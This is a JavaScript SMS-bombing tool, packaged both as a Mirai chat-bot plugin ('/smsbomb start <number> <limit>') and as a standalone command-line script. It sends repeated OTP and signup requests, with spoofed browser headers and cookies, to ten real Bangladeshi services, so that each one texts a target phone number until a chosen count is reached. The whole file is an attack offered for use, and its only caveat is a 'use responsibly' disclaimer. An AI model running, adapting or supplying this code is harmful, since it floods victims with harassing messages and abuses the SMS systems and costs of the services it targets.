
// Dependencies
const axios = require('axios');
const { exec } = require('child_process');
const { promisify } = require('util');

// Promisify exec for system commands
const execAsync = promisify(exec);

//---------{ ADMIN INFO }----------
// AUTHOR   :Ahsan Habib       
// TEAM     : Bangladesh Cyber 2.0
//-------------------------------- 

// Clear screen function
function clearScreen() {
    if (process.platform === 'win32') {
        exec('cls');
    } else {
        exec('clear');
    }
}

function slw(l) {
    for (let i of l) {
        process.stdout.write(i);
        // Sleep implementation for JavaScript
        const start = Date.now();
        while (Date.now() - start < 100) {
            // 0.1 second delay equivalent
        }
    }
}

// Mirai Bot Plugin Export
module.exports = {
    name: 'sms-bomber',
    description: 'SMS Bombing Tool',
    version: '1.0',
    author: 'Ahsan Habib',
    
    // Plugin initialization
    onLoad: function(api) {
        console.log('SMS Bomber plugin loaded');
    },
    
    // Command handler
    onMessage: async function(api, event) {
        const { messageReply, getUserInfo } = api;
        const { senderID, threadID, body } = event;
        
        // Check if message starts with command prefix
        if (!body || !body.toLowerCase().startsWith('/smsbomb')) {
            return;
        }
        
        const args = body.split(' ');
        
        // Show help menu
        if (args.length === 1) {
            const logo = `🎯 SMS BOMBER BOT 🎯

██████╗░░█████╗░░░░░░░██████╗░░░░░█████╗░
██╔══██╗██╔══██╗░░░░░░╚════██╗░░░██╔══██╗
██████╦╝██║░░╚═╝█████╗░░███╔═╝░░░██║░░██║
██╔══██╗██║░░██╗╚════╝██╔══╝░░░░░██║░░██║
██████╦╝╚█████╔╝░░░░░░███████╗██╗╚█████╔╝
╚═════╝░░╚════╝░░░░░░░╚══════╝╚═╝░╚════╝░

××××××××××××××××××××××××××××××××××××××××××××
DEVELOPER :Ahsan Habib 
GITHUB    : ahmhabib01
VERSION   : 1.0
PROJECT   : SMS BOMBER 
FACEBOOK  : Bangladesh Cyber 2.0
××××××××××××××××××××××××××××××××××××××××××××

📋 COMMANDS:
🔸 /smsbomb start <number> <limit> - Start SMS bombing
🔸 /smsbomb info - Contact developer

📱 Example: /smsbomb start 1234567890 10

⚠️ Use responsibly! Developer not responsible for misuse.`;
            
            return messageReply(logo, threadID);
        }
        
        // Handle different subcommands
        const subCommand = args[1]?.toLowerCase();
        
        if (subCommand === 'info') {
            const infoMsg = `📧 Contact Developer:
🌐 Facebook: Bangladesh Cyber 2.0
👤 GitHub: ahmhabib01
📱 Developer: Ahsan Habib

🔗 Facebook Link: https://www.facebook.com/ahm.habib.39`;
            
            return messageReply(infoMsg, threadID);
        }
        
        if (subCommand === 'start') {
            if (args.length < 4) {
                return messageReply('❌ Usage: /smsbomb start <number> <limit>\nExample: /smsbomb start 1234567890 5', threadID);
            }
            
            const num = args[2];
            const limit = parseInt(args[3]);
            
            if (isNaN(limit) || limit <= 0) {
                return messageReply('❌ Invalid limit. Please enter a positive number.', threadID);
            }
            
            if (!/^\d{10,11}$/.test(num)) {
                return messageReply('❌ Invalid phone number format. Please enter 10-11 digits.', threadID);
            }
            
            // Start bombing process
            messageReply(`🚀 Starting SMS bombing...
📱 Target: 880${num}
🎯 Limit: ${limit}
⏳ Please wait...`, threadID);
            
            await primiam(num, limit, messageReply, threadID);
        }
    }
};

async function primiam(num, limit, messageReply, threadID) {
    const headers = {
        'authority': 'www.bioscopelive.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'referer': 'https://www.bioscopelive.com/en/login',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    };
    
    const url1 = `https://www.bioscopelive.com/en/login/send-otp?phone=880${num}&operator=bd-otp`;
    
    const headers2 = {
        'referer': 'https://redx.com.bd/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data1 = {
        'name': num,
        'phoneNumber': num,
        'service': 'redx',
    };
    
    const url2 = "https://api.redx.com.bd/v1/user/signup";
    
    const headers3 = {
        'authority': 'bikroy.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'bn',
        'application-name': 'web',
        'referer': 'https://bikroy.com/bn/users/login',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url3 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + num;
    
    const headers4 = {
        'authority': 'www.ieatery.com.bd',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'referer': 'https://www.ieatery.com.bd/login',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url4 = "https://www.ieatery.com.bd/otp-verify?phn=0" + num;
    
    const headers5 = {
        'referer': 'https://doctime.com.bd/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data2 = {
        'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
        'code': '88',
        'contact_no': '0' + num,
        'country_calling_code': '88',
    };
    
    const headers6 = {
        'referer': 'https://osudpotro.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data3 = {
        'mobile': '+88-0' + num,
        'deviceToken': 'web',
        'language': 'en',
        'os': 'web',
    };
    
    const headers7 = {
        'referer': 'https://osudpotro.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data4 = {
        'mobile': '+88-0' + num,
        'deviceToken': 'web',
        'language': 'en',
        'os': 'web',
    };
    
    const headers8 = {
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Origin': 'https://hungrynaki.com',
        'Referer': 'https://hungrynaki.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'accept': '*/*',
        'content-type': 'application/json',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    };
    
    const data8 = {
        'operationName': 'createOtp',
        'variables': {
            'phone': "" + num,
            'country': '880',
            'uuid': '6fdb595b-a310-4f82-acca-a9b9c43e4eb0',
            'osVersionCode': 'Linux aarch64',
            'deviceBrand': 'Chrome',
            'deviceModel': '107',
            'requestFrom': 'U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=',
        },
        'query': 'mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n',
    };
    
    const cookies9 = {
        '_ga': 'GA1.3.1671188319.1677642641',
        '_gid': 'GA1.3.407134519.1677642641',
        '_gat_UA-146796176-2': '1',
        '_fbp': 'fb.2.1677642641903.2005162471',
        '_ga_5LF4359FD3': 'GS1.1.1677642640.1.1.1677642660.0.0.0',
    };
    
    const headers9 = {
        'authority': 'fundesh.com.bd',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fundesh.com.bd',
        'referer': 'https://fundesh.com.bd/fundesh/profile',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const params9 = {
        'service_key': '',
    };
    
    const json_data9 = {
        'msisdn': '' + num,
    };
    
    const headers10 = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Origin': 'https://ecourier.com.bd',
        'Referer': 'https://ecourier.com.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    };
    
    const url10 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0" + num;
    
    // Convert cookies object to cookie string
    const cookieString = Object.entries(cookies9).map(([key, value]) => `${key}=${value}`).join('; ');
    
    let ses = 0;
    let successCount = 0;
    let statusMessage = `📊 SMS Bombing Status:
📱 Target: 880${num}
🎯 Limit: ${limit}
✅ Sent: 0
📈 Progress: 0%`;
    
    // Send initial status
    messageReply(statusMessage, threadID);
    
    while (limit > ses) {
        try {
            const sent1 = await axios.get(url1, { headers: headers });
            if (sent1.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via Bioscope: ${ses}`);
            }
        } catch (error) {
            // pass - equivalent to Python's pass statement
        }
        
        try {
            const sent2 = await axios.post(url2, data1, { headers: headers2 });
            if (sent2.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via RedX: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        try {
            const sent3 = await axios.get(url3, { headers: headers3 });
            if (sent3.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via Bikroy: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        try {
            const sent4 = await axios.get(url4, { headers: headers4 });
            if (sent4.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via iEatery: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        try {
            const sent5 = await axios.post('https://admin.doctime.com.bd/api/authenticate', data2, { headers: headers5 });
            if (sent5.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via DocTime: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        try {
            const sent6 = await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data3, { headers: headers6 });
            if (sent6.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via Osudpotro: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        try {
            const sent7 = await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data4, { headers: headers7 });
            if (sent7.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via Osudpotro 2: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        try {
            const sent8 = await axios.post('https://api-v4-1.hungrynaki.com/graphql', data8, { headers: headers8 });
            if (sent8.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via HungryNaki: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        try {
            const sent9 = await axios.post(
                'https://fundesh.com.bd/api/auth/generateOTP',
                json_data9,
                {
                    headers: { ...headers9, 'Cookie': cookieString },
                    params: params9
                }
            );
            if (sent9.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via Fundesh: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        try {
            const sent10 = await axios.get(url10, { headers: headers10 });
            if (sent10.status === 200) {
                ses += 1;
                successCount += 1;
                console.log(`SMS sent via eCourier: ${ses}`);
            }
        } catch (error) {
            // pass
        }
        
        // Update progress every 5 successful attempts
        if (successCount % 5 === 0 && successCount > 0) {
            const progress = Math.min(100, Math.round((successCount / limit) * 100));
            const progressBar = '█'.repeat(Math.floor(progress / 10)) + '░'.repeat(10 - Math.floor(progress / 10));
            
            statusMessage = `📊 SMS Bombing Status:
📱 Target: 880${num}
🎯 Limit: ${limit}
✅ Sent: ${successCount}
📈 Progress: ${progress}%
[${progressBar}]`;
            
            messageReply(statusMessage, threadID);
        }
    }
    
    // Final completion message
    const completionMessage = `🎉 SMS BOMBING COMPLETED!

📱 Target: 880${num}
✅ Successfully Sent: ${successCount}
🎯 Target Limit: ${limit}
📈 Success Rate: ${Math.round((successCount / limit) * 100)}%

      ____  ____  _  ________
     / __ \\/ __ \\/ | / / ____/
    / / / / / / /  |/ / __/   
   / /_/ / /_/ / /|  / /___   
  /_____/\\____/_/ |_/_____/   
                            
 TNQ FOR USING OUR TOOLS 🖤🥰

🌐 Facebook: https://www.facebook.com/ahm.habib.39
👨‍💻 Developer: Ahsan Habib
🔗 Team: Bangladesh Cyber 2.0

⚠️ Use responsibly! Developer not responsible for misuse.`;
    
    messageReply(completionMessage, threadID);
}

// Legacy functions for compatibility
function clearScreen() {
    if (process.platform === 'win32') {
        exec('cls');
    } else {
        exec('clear');
    }
}

function slw(l) {
    for (let i of l) {
        process.stdout.write(i);
        // Sleep implementation for JavaScript
        const start = Date.now();
        while (Date.now() - start < 100) {
            // 0.1 second delay equivalent
        }
    }
}

// For standalone execution compatibility
async function main() {
    const readline = require('readline');
    const { promisify } = require('util');
    
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    const question = promisify(rl.question).bind(rl);
    
    const logo = `  \x1b[1;37m

██████╗░░█████╗░░░░░░░██████╗░░░░░█████╗░
██╔══██╗██╔══██╗░░░░░░╚════██╗░░░██╔══██╗
██████╦╝██║░░╚═╝█████╗░░███╔═╝░░░██║░░██║
██╔══██╗██║░░██╗╚════╝██╔══╝░░░░░██║░░██║
██████╦╝╚█████╔╝░░░░░░███████╗██╗╚█████╔╝
╚═════╝░░╚════╝░░░░░░░╚══════╝╚═╝░╚════╝░                                    
                                       
××××××××××××××××××××××××××××××××××××××××××××
\x1b[1;37m❲\x1b[38;5;46m+\x1b[1;37m❳ DEVELOPER :Ahsan Habib 
\x1b[1;37m❲\x1b[38;5;46m+\x1b[1;37m❳ GITHUB    : ahmhabib01
\x1b[1;37m❲\x1b[38;5;46m+\x1b[1;37m❳ VERSION   : 1.0
\x1b[1;37m❲\x1b[38;5;46m+\x1b[1;37m❳ PROJECT   : SMS BOMBING 
\x1b[1;37m❲\x1b[38;5;46m+\x1b[1;37m❳ FACEBOOK  : Bangladesh Cyber 2.0 
××××××××××××××××××××××××××××××××××××××××××××`;
    
    console.log(logo);
    console.log("[01] START SMS BOMBING ");
    console.log("[02] CONTACT ME ON FACEBOOK ");
    console.log("××××××××××××××××××××××××××××××××××××××××××××");
    
    const usr = await question("\x1b[38;5;195m[\x1b[38;5;46m+\x1b[38;5;195m]\x1b[38;5;46m YOUR CHOICE \x1b[38;5;195m: ");
    const usrClean = usr.replace(/ /g, "");
    
    if (usrClean === "1" || usrClean === "01") {
        clearScreen();
        const num = await question("\n\n\x1b[38;5;195m[\x1b[38;5;46m+\x1b[38;5;195m] VICTIMS NUMBER : 880");
        const limitInput = await question("\n\x1b[38;5;195m[\x1b[38;5;46m+\x1b[38;5;195m] MESSAGE LIMIT : ");
        const limit = parseInt(limitInput);
        
        await primiam(num, limit, console.log, null);
    } else if (usrClean === "2" || usrClean === "02") {
        // Open Facebook page
        if (process.platform === 'darwin') {
            exec('open https://www.facebook.com/ahm.habib.39');
        } else if (process.platform === 'win32') {
            exec('start https://www.facebook.com/ahm.habib.39');
        } else {
            exec('xdg-open https://www.facebook.com/ahm.habib.39');
        }
        rl.close();
        process.exit();
    } else {
        console.log("\x1b[38;5;195m\n[\x1b[1;31m!\x1b[38;5;195m]\x1b[1;31m WRONG OPTION ENTERED..\n");
        rl.close();
        process.exit();
    }
    
    rl.close();
}

// Execute main function if running standalone
if (require.main === module) {
    main().catch(console.error);
}

